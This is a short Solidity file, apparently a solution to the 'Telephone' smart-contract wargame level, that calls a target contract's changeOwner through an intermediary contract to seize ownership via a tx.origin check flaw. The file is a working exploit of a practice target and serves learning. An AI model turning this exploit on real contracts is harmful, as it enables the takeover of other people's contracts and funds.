// SPDX-License-Identifier: MIT
//
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address) external;
}
 
contract TelephoneAttack {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _targetContract) public {
        ITelephone telephone = ITelephone(_targetContract);
        telephone.changeOwner(owner);
    }
}
